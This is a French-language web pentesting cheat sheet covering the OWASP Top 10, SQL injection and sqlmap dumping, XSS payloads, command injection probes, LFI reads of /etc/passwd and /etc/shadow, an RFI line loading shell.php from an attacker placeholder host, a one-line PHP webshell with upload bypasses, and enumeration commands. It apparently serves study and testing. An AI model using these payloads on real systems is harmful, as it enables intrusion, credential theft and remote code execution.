# Web Application Security Basics

## OWASP Top 10

| #  | Vulnerabilite                         | Description                              |
|----|---------------------------------------|------------------------------------------|
| 1  | Broken Access Control                 | Acces a des ressources non autorisees    |
| 2  | Cryptographic Failures                | Donnees sensibles mal protegees          |
| 3  | Injection (SQLi, XSS, Command Inj.)  | Donnees utilisateur non validees         |
| 4  | Insecure Design                       | Failles de conception                    |
| 5  | Security Misconfiguration             | Configs par defaut, services exposes     |
| 6  | Vulnerable Components                 | Librairies/frameworks obsoletes          |
| 7  | Auth & Identification Failures        | Authentification faible ou cassee        |
| 8  | Software & Data Integrity Failures    | Mises a jour non verifiees, CI/CD       |
| 9  | Security Logging & Monitoring Failures| Manque de detection                      |
| 10 | Server-Side Request Forgery (SSRF)    | Forcer le serveur a faire des requetes   |

## SQL Injection

### Detection

```
# Tester dans les champs de saisie / URL
' OR 1=1--
' OR '1'='1
" OR ""="
' UNION SELECT NULL--
```

### Exploitation

```bash
# SQLMap
sqlmap -u "http://IP/page?id=1" --dbs
sqlmap -u "http://IP/page?id=1" -D database --tables
sqlmap -u "http://IP/page?id=1" -D database -T table --dump

# SQLMap avec requete POST
sqlmap -u "http://IP/login" --data="user=admin&pass=test" --dbs

# SQLMap avec cookie
sqlmap -u "http://IP/page?id=1" --cookie="PHPSESSID=abc123" --dbs
```

### Types de SQLi

- **Union-based** : `' UNION SELECT 1,2,3--`
- **Error-based** : forcer des erreurs pour extraire des donnees
- **Blind (Boolean)** : `' AND 1=1--` vs `' AND 1=2--`
- **Blind (Time-based)** : `' AND SLEEP(5)--`

## Cross-Site Scripting (XSS)

### Types

- **Reflected** : payload dans l'URL, execute cote client
- **Stored** : payload stocke en base, execute pour chaque visiteur
- **DOM-based** : manipulation du DOM cote client

### Payloads de test

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
```

## Command Injection

```bash
# Tester
; whoami
| whoami
$(whoami)
`whoami`
&& whoami
|| whoami
```

## File Inclusion

### Local File Inclusion (LFI)

```
http://IP/page?file=../../../../etc/passwd
http://IP/page?file=../../../../etc/shadow
# Bypass filtres
http://IP/page?file=....//....//etc/passwd
# PHP wrappers
http://IP/page?file=php://filter/convert.base64-encode/resource=index.php
```

### Remote File Inclusion (RFI)

```
http://IP/page?file=http://ATTAQUANT/shell.php
```

## File Upload

```bash
# Tenter d'upload un webshell
# Bypass : changer l'extension (.php5, .phtml, .phar)
# Bypass : modifier le Content-Type
# Bypass : ajouter des magic bytes

# Webshell PHP simple
<?php system($_GET['cmd']); ?>
```

## Burp Suite - Bases

| Fonctionnalite | Usage                              |
|----------------|------------------------------------|
| Proxy          | Intercepter les requetes           |
| Repeater       | Modifier et rejouer des requetes   |
| Intruder       | Brute force / fuzzing              |
| Decoder        | Encoder/decoder des donnees        |

```
# Configurer le navigateur pour passer par Burp
Proxy : 127.0.0.1:8080
# Installer le certificat CA de Burp pour HTTPS
```

## Enumeration web

```bash
# Technologies
whatweb http://IP
wappalyzer (extension navigateur)

# Directories et fichiers
gobuster dir -u http://IP -w wordlist -x php,html,txt,bak
feroxbuster -u http://IP

# Sous-domaines / vhosts
gobuster vhost -u http://IP -w wordlist
wfuzz -c -w wordlist -H "Host: FUZZ.domaine.com" http://IP

# Fichiers sensibles courants
/robots.txt
/.git/
/sitemap.xml
/.env
/wp-config.php.bak
/web.config
```
